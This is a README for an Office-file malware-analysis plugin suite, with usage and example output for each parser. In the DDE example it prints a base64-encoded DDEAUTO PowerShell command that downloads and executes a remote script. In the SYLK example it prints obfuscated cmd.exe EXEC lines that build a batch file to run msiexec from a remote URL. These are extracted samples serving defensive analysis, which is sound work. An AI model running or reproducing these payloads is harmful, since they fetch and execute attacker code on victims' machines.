# Azul Microsoft Plugin Office

Parse and feature Microsoft Office files using third-party tools and libraries.
In particular _oletools_ is used by several plugins.

Python-oletools is a suite of parsing tools by _Phillipe Lagadec_ available
at: `http://www.decalage.info/en/python/oletools`.

## Development Installation

To install azul-plugin-office for development run the command
(from the root directory of this project):

```bash
pip install -e .
```

## Usage: azul-dde

Parses multiple Microsoft Office formats for embedded DDE links.

# NOTE THE STRING

RERFQVVUTyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgIi9rIHBvd2Vyc2hlbGwgLUMgO2VjaG8gXCJodHRwczovL3NlYy5nb3YvXCI7SUVYKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcHhTRTJUSjEnKSkgIg==

Is the base64 encoded value of the actual value to avoid flagging on windows AV.

Command to decode the value to see it as a string:
`echo 'RERFQVVUTyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgIi9rIHBvd2Vyc2hlbGwgLUMgO2VjaG8gXCJodHRwczovL3NlYy5nb3YvXCI7SUVYKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcHhTRTJUSjEnKSkgIg==' | base64 -d`

Usage on local files:

```
azul-dde test.doc
```

Example Output:

```
----- OfficeDDE results -----
OK

Output features:
  dde_command: RERFQVVUTyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgIi9rIHBvd2Vyc2hlbGwgLUMgO2VjaG8gXCJodHRwczovL3NlYy5nb3YvXCI7SUVYKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvcHhTRTJUSjEnKSkgIg==
      dde_url: https://pastebin.com/raw/pxSE2TJ1
               https://sec.gov/
Feature key:
  dde_command:  Embedded Office DDE command to execute
  dde_url:  URL Extracted from an embedded DDE link
```

Automated usage in system:

```
azul-dde --server http://azul-dispatcher.localnet/
```

## Usage: azul-officedecrypt

Extract encryption information and attempts to decrypt documents with known
password lists. Supports being fed a password dictionary from upstream
plugins.

Usage on local files:

```
azul-officedecrypt test.xlsx
```

Example Output:

```
----- OfficeDecryptor results -----
OK

Output features:
       office_encryption_algorithm: AES-128
           office_encrypted_format: ooxml
                               tag: encrypted
                 office_secret_key: f2d41e0fc7984dff9f86ca5b7346954d
                          password: VelvetSweatshop
        office_encryption_key_size: 128
        office_encryption_verifier: eabc04125921a480eef88a2ec27e7c0d
   office_encryption_verifier_hash: ec19cefd7446f22e82c092d16dbb85817fb25b02324de7236bd5f568411e06db
          office_encryption_method: ECMA-376 Standard
            office_encryption_salt: verifier - b30b21a608e77e3ab527f52ba693c08d
                   office_password: VelvetSweatshop
        office_encryption_provider: Microsoft Enhanced RSA and AES Cryptographic Provider
  office_encryption_hash_algorithm: SHA1

Generated child entities (1):
  {'action': 'decrypted', 'algorithm': 'AES-128', 'password': 'VelvetSweatshop'} <binary: 1e19ba64f162dc43f4a0fa95834dea5001e91e349a6811a627b3edba401f520d>
    content: 160208 bytes

Feature key:
  office_encryption_algorithm:  Encryption algorithm used on document
  office_encrypted_format:  Office document type that was encrypted
  tag:  Any informational label about the sample
  office_secret_key:  Intermediate secret key used for decryption
  password:  Password used to decrypt the document
  office_encryption_key_size:  Size in bits of key used to encrypt the document
  office_encryption_verifier:  Encrypted verifier input value
  office_encryption_verifier_hash:  Encrypted verifier hash
  office_encryption_method:  Office encryption method used
  office_encryption_salt:  Salt value used during encryption
  office_password:  Password used to decrypt the document
  office_encryption_provider:  Cryptographic provider used for encryption
  office_encryption_hash_algorithm:  Hash algorithm used for verification
```

Automated usage in system:

```
azul-officedecrypt --server http://azul-dispatcher.localnet/
```

## Usage: azul-oleinfo

Parses Microsoft OLE2 files (xls, doc, etc) for metadata to feature.

Usage on local files:

```
azul-oleinfo test.doc
```

Example Output:

```
----- OleInfo results -----
OK

Output features:
   document_word_count: 405
          ole_codepage: 1252
  document_last_author: Vb1
       ole_count_lines: 19
          ole_template: Normal.dotm
   document_page_count: 1
      document_created: 2015-07-16 12:19:00
       ole_application: Microsoft Office Word
   document_last_saved: 2015-07-16 12:19:00
  ole_count_paragraphs: 5
          ole_revision: 2
        ole_time_saved: 2015-07-16 12:19:00
           ole_version: 983040
       document_author: Vb1
       ole_count_words: 405
      ole_time_created: 2015-07-16 12:19:00
      ole_codepage_doc: 1252
          ole_saved_by: Vb1
       ole_count_chars: 2311
            ole_author: Vb1
       ole_count_pages: 1

Feature key:
  document_author:  Document author name
  document_created:  Time the document was created
  document_last_author:  Name of user who last saved the document
  document_last_saved:  Time the document was last saved
  document_page_count:  Count of pages in the document
  document_word_count:  Count of words in the document
  ole_application:  Application used to create OLE document
  ole_author:  Author of the OLE document
  ole_codepage:  Codepage specified by the SummaryInformation stream
  ole_codepage_doc:  Codepage specified by the DocumentSummaryInformation stream
  ole_count_chars:  Number of characters in OLE document
  ole_count_lines:  Number of lines in OLE document
  ole_count_pages:  Number of pages in OLE document
  ole_count_paragraphs:  Number of paragraphs in OLE document
  ole_count_words:  Number of words in OLE document
  ole_revision:  Revision number of the OLE document
  ole_saved_by:  Name of user who last saved the document
  ole_template:  Name of the template used in the OLE document
  ole_time_created:  Time document was created
  ole_time_saved:  Time document was last saved
  ole_version:  OLE document version number
```

Automated usage in system:

```
azul-oleinfo --server http://azul-dispatcher.localnet/
```

## Usage: azul-openxmlinfo

Parses Microsoft Office Open XML files (xlsx, docx, etc) for metadata to feature.

Usage on local files:

```
azul-oleinfo test.xlsx
```

Example Output:

```
----- OpenXmlInfo results -----
OK

Output features:
          openxml_time_modified: 2011-08-24 13:18:22+00:00
          openxml_external_link: externalLinkPath - file:///C:\Users\foobar\AppData\Local\Microsoft\Windows\Temporary%20Internet%20Files\Content.Outlook\PW(2).xlsm
                                 externalLinkPath - file:///C:\Users\foobar\AppData\Local\Microsoft\Windows\Temporary%20Internet%20Files\Content.Outlook\NY.xlsx
           openxml_count_sheets: 17
           openxml_time_printed: 2011-04-18 12:20:35+00:00
              macro_subfilename: xl/vbaProject.bin
            openxml_application: Microsoft Excel
    openxml_version_last_edited: 5
                 document_title: PW TEMPLATE
     openxml_external_link_type: externalLinkPath
               document_created: 2002-04-15 16:51:11+00:00
                openxml_creator: FOOBAR
           openxml_content_type: application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings - bin
                                 image/x-emf - emf
                                 application/vnd.openxmlformats-package.relationships+xml - rels
                                 application/vnd.openxmlformats-officedocument.vmlDrawing - vml
                                 image/x-wmf - wmf
                                 application/xml - xml
          openxml_version_build: 9302
           document_last_author: Bar, Foo
  openxml_version_lowest_edited: 4
     openxml_calc_properties_id: 145621
          openxml_macro_objects: 1
                openxml_printer: Canon MX880 series Printer
                                 \\PRINTSRV\HP2600N
               openxml_security: 0
        openxml_activex_classid: {8BD21D40-EC42-11CE-9E0D-00AA006002F3}
                                 {D7053240-CE69-11CD-A777-00DD01143C57}
    openxml_application_version: 14.0300 - Microsoft Excel
           openxml_heading_part: Named Ranges
                                 Worksheets
        openxml_activex_objects: 65
                document_author: FOOBAR
                            tag: openxml_contains_activex
                                 openxml_contains_macros
           openxml_time_created: 2002-04-15 16:51:11+00:00
            document_last_saved: 2011-08-24 13:18:22+00:00
            openxml_modified_by: Bar, Foo
          openxml_media_objects: 41
     openxml_heading_part_count: Worksheets - 16
                                 Named Ranges - 85
                  openxml_title: PW TEMPLATE

Feature key:
  document_author:  Document author name
  document_created:  Time the document was created
  document_last_author:  Name of user who last saved the document
  document_last_saved:  Time the document was last saved
  document_title:  Document title
  macro_subfilename:  Filename of the OLE subfile within OpenXML zip
  openxml_activex_classid:  ActiveX classid referenced in document
  openxml_activex_objects:  Count of ActiveX objects contained in document
  openxml_application:  Application used to create the document
  openxml_application_version:  Version of application used to create document
  openxml_calc_properties_id:  Calculation properties Id in workbook
  openxml_content_type:  Content type/exts stored in the document
  openxml_count_sheets:  Count of sheets in workbook
  openxml_creator:  Author of the Open XML document
  openxml_external_link:  Document relationships with external target
  openxml_external_link_type:  External relationship types in the document
  openxml_heading_part:  Document parts from HeadingPairs property
  openxml_heading_part_count:  Document part counts from HeadingPairs property
  openxml_macro_objects:  Count of macro objects contained in document
  openxml_media_objects:  Count of media files contained in document
  openxml_modified_by:  Last user to modify the Open XML document
  openxml_printer:  Printer device names extracted from document
  openxml_security:  DocSecurity setting from properties
  openxml_time_created:  Time the Open XML document was created
  openxml_time_modified:  Time the Open XML document was last saved
  openxml_time_printed:  Time the Open XML document was last printed
  openxml_title:  Title of the Open XML document
  openxml_version_build:  Workbook incremental public release version info
  openxml_version_last_edited:  Workbook last edited version info
  openxml_version_lowest_edited:  Workbook lowest edited version info
  tag:  An informational label about the document
```

Automated usage in system:

```
azul-openxmlinfo --server http://azul-dispatcher.localnet/
```

## Usage: azul-mimeinfo

Parses MIME HTML formatted documentsi (.mht).

These are created when saving a document as "Single Web Page" in Microsoft
Office.

Usage on local files:

```
azul-mimeinfo test.mht
```

Example Output:

```
----- MimeInfo results -----
OK

Output features:
   document_last_author: User426
        document_author: User323
    document_page_count: 44
             mime_title:
  mime_count_paragraphs: 1
        mime_time_saved: 2012-05-01 14:12:00
       mime_count_words: 17
    mime_office_version: 11.9999
            mime_author: User323
       mime_last_author: User426
       mime_count_chars: 101
       mime_count_lines: 1
                    tag: mhtml_doc
          mime_revision: 4
       document_created: 2012-05-01 14:08:00
         document_title:
      mime_time_created: 2012-05-01 14:08:00
     mime_edit_duration: 2
    document_last_saved: 2012-05-01 14:12:00
       mime_count_pages: 44
    document_word_count: 17

Feature key:
  document_author:  Document author name
  document_created:  Time the document was created
  document_last_author:  Name of user who last saved the document
  document_last_saved:  Time the document was last saved
  document_page_count:  Count of pages in the document
  document_title:  Document title
  document_word_count:  Count of words in the document
  mime_author:  Author name in the MIME HTML document
  mime_count_chars:  Number of characters in the MIME HTML document
  mime_count_lines:  Number of lines in the MIME HTML document
  mime_count_pages:  Number of pages in the MIME HTML document
  mime_count_paragraphs:  Number of paragraphs in the MIME HTML document
  mime_count_words:  Number of words in the MIME HTML document
  mime_edit_duration:  Total editing time spent on the document in minutes
  mime_last_author:  Last user to save the MIME HTML document
  mime_office_version:  Version of Microsoft Office that created the document
  mime_revision:  Revision number of the MIME document
  mime_time_created:  Time of when the MIME document was first created
  mime_time_saved:  Time of when the MIME document was last saved
  mime_title:  Title of the document in the MIME HTML properties
  tag:  An informational label about the document
```

Automated usage in system:

```
azul-mimeinfo --server http://azul-dispatcher.localnet/
```

## Usage: azul-rtfinfo

Parses Microsoft Rich Text Format (RTF) documents for metadata to feature.

Usage on local files:

```
azul-rtfinfo test.doc
```

Example Output:

```
----- RtfInfo results -----
OK

Output features:
           rtf_author: Vb1
      document_author: Vb1
             rtf_type: b'rtf1'
           rtf_revtim: 2015-07-16 15:20:00
  document_last_saved: 2015-07-16 15:20:00
          rtf_creatim: 2015-07-16 15:15:00
             rtf_vern: 67307266
          rtf_comment: LibreOffice
     document_created: 2015-07-16 15:15:00

Feature key:
  document_author:  Document author name
  document_created:  Time the document was created
  document_last_saved:  Time the document was last saved
  rtf_author:  Author of the document
  rtf_comment:  Comments saved with the document
  rtf_creatim:  Document creation time
  rtf_revtim:  Last revision time of the document
  rtf_type:  rtf type indicated by the first few bytes of the file
  rtf_vern:  Internal version number
```

Automated usage in system:

```
azul-rtfinfo --server http://azul-dispatcher.localnet/
```

## Usage: azul-macros

Extracts and analyses VBA Macros from Microsoft OLE2 files (xls, doc, etc.)
and OpenXML files (xlsx, docx, etc.).

Usage on local files:

```
azul-macros test.docx
```

Example Output:

```
----- Macros results -----
OK

Output features:
     macro_suspicious: Output - May write to a file (if combined with Open)
                       System - May run an executable file or a system command on a Mac (if combined with libc.dylib)
                       Write - May write to a file (if combined with Open)
                  tag: vba_macro
  macro_indicator_url: https://communityhosting.innovasys.com/ic_community.aspx

Feature key:
  macro_indicator_url:  URL pattern found in document macro
  macro_suspicious:  Suspicious keywords that may be used by malware
  tag:  Any informational label about the sample

```

Automated usage in system:

```
azul-macros --server http://azul-dispatcher.localnet/
```

## Usage: azul-sylk

Parses Microsoft SYLK files (.slk) for metadata to feature.

Usage on local files:

```
azul-sylk test.slk
```

Example Output:

```
----- OfficeSylk results -----
OK

Output features:
             sylk_command: EXEC - "cmD.exe  /c @echo off&ping 5&EcHo|s^et /p=""xec /ihttp^:^/^/^investorcirclek"">>%temp%\JxeHo.bat"
                           EXEC - "cmD.exe  /c @echo off&ping 5&ping 5&EcHo|s^et /p=""h.com/about-us.php "">>%temp%\JxeHo.bat"
                           EXEC - "cmD.exe  /c @echo off&ping 5&ping 5&ping 5&EcHo|s^et /p="" ^/q'"">>%temp%\JxeHo.bat&%temp%\JxeHo.bat"
                           EXEC - "cmD.exe  /c EChO|SE^t /p=""@echo off&wmic process call create 'Msie"">%temp%\JxeHo.bat"
                 sylk_url: http://investorcirclek
            sylk_function: EXEC
                           HALT
               fileformat: SYLK
  sylk_command_normalised: cmd.exe  /c @echo off&ping 5&echo|set /p=""xec /ihttp://investorcirclek"">>%temp%\jxeho.bat
                           cmd.exe  /c @echo off&ping 5&ping 5&echo|set /p=""h.com/about-us.php "">>%temp%\jxeho.bat
                           cmd.exe  /c @echo off&ping 5&ping 5&ping 5&echo|set /p="" /q'"">>%temp%\jxeho.bat&%temp%\jxeho.bat
                           cmd.exe  /c echo|set /p=""@echo off&wmic process call create 'msie"">%temp%\jxeho.bat

Feature key:
  fileformat:  System normalised file type format
  sylk_command:  Embedded Office execution command in symbolic link file
  sylk_command_normalised:  Normalised version of extracted execution commands
  sylk_function:  Macro function found in symbolic link file
  sylk_url:  URL Extracted from an embedded symbolic link command
```

Automated usage in system:

```
azul-sylk --server http://azul-dispatcher.localnet/
```

## Python Package management

This python package is managed using a `setup.py` and `pyproject.toml` file.

Standardisation of installing and testing the python package is handled through tox.
Tox commands include:

```bash
# Run all standard tox actions
tox
# Run linting only
tox -e style
# Run tests only
tox -e test
```

## Dependency management

Dependencies are managed in the requirements.txt, requirements_test.txt and debian.txt file.

The requirements files are the python package dependencies for normal use and specific ones for tests
(e.g pytest, black, flake8 are test only dependencies).

The debian.txt file manages the debian dependencies that need to be installed on development systems and docker images.

Sometimes the debian.txt file is insufficient and in this case the Dockerfile may need to be modified directly to
install complex dependencies.
